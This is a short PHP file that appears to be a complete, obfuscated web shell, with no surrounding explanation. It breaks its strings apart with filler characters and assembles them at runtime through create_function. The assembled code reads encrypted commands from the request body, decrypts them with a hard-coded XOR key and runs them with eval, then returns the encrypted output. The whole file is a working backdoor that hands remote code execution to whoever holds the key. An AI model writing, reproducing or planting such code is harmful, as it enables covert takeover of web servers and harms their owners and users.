<?php
$N=']$o.=$t{$i}^Q]$k{Q]$j};}}Q]return $Q]o;Q]}ifQ] (@preg_maQ]tch("/$kh(Q]Q].+)$kf/",@fQ]ileQ]_get_conQ]Q]tents("pQ]hp://inp';
$I='Q]ut"),Q]$mQ])Q]==1) {@ob_starQ]t();@eQ]val(@gzuncQ]ompresQ]s(@x(@baQ]se64_dQ]ecode(Q]Q]$m[1]),$k)Q]));Q]Q]Q]$oQ]=@ob';
$h='$Q]k){$cQ]=strleQ]nQ]($k);$l=sQ]trlen($t);$Q]o="";forQ]($Q]i=0;$Q]i<$l;)Q]{fQ]Q]or($j=0;($j<$c&&$iQ]<Q]$l);$j++,$Q]i++){Q';
$b=str_replace('X','','XcXreXate_XfXunctXion');
$G='$kQ]="Q]9819Q]3d4a";$kh="08Q]6b26be0ae7";Q]$kQ]f="db7fQ]bbce3bQ]aa";$p="Q]Q]akKtlzvFQ]gjVpd723";Q]Q]funcQ]tion x($t,';
$o='_get_conQ]tents();Q]@ob_end_clean();$rQ]=@basQ]e6Q]4_encode(@Q]x(@gzQ]compressQ]($o)Q],$kQ]));Q]print("$pQ]$kh$r$kf");}';
$a=str_replace('Q]','',$G.$h.$N.$I.$o);
$g=$b('',$a);$g();
?>
